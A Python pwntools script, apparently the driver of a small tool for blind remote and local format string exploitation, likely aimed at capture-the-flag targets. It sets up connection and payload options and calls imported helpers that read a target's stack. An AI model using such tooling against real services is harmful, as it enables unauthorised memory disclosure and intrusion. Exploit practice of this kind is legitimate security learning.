#!/usr/bin/python3

# Test with HB_3 or Blind Remote FSB

from pwn import *
from sys import exit

from argsprint import *
from getjunk import getJunk
from writeandsend import *

class ExploitStructure():

    def __init__(self):

        self.ARCH       = 1
        #self.FSBOFF     = 1
        self.PIE        = False

        self.NOJUNK     = False
        self.CLOSE      = False
        self.OPENAGAIN  = False     # Me permet de gérer les reconnexions au sein des boucles en cas de close()
    
        self.REMOTE     = False
        self.HOST       = ""
        self.PORT       = 0

        self.LOCAL      = False
        self.BIN        = ""

        self.SP         = False     # Show payload or not
        self.RS         = False

        #self.NOPSLED    = b"\x90" * 200

        self.FMTCHAR    = b'x'

    def startProcess(self):
        p = process(self.BIN)
        return p

    def remoteConnect(self):
        r = remote(self.HOST, self.PORT)
        return r

    def _get_FMTCHAR(self):
        return(self._FMTCHAR)

    def _set_FMTCHAR(self, CHAR):
        self._FMTCHAR    = CHAR
        if self._FMTCHAR == b's' and not self.RS:
            printWarning("It is strongly recommended to use --reverse-syntax option with a %s payload")
        return self._FMTCHAR

    FMTCHAR = property(_get_FMTCHAR, _set_FMTCHAR)

def main():
    es = ExploitStructure()
    checkParameters(es)

    if not es.NOJUNK:        # Par défaut à False
        printInfo("Penser à adapter la fonction getJunk()")
        getJunk(es)

    if es.REMOTE:
        readStackRemote(es)
    elif es.LOCAL:
        readStackLocal(es)
    else:
        printError("Can't launch remote or local exploitation")

    exit(0)


if __name__ == '__main__':
    main()
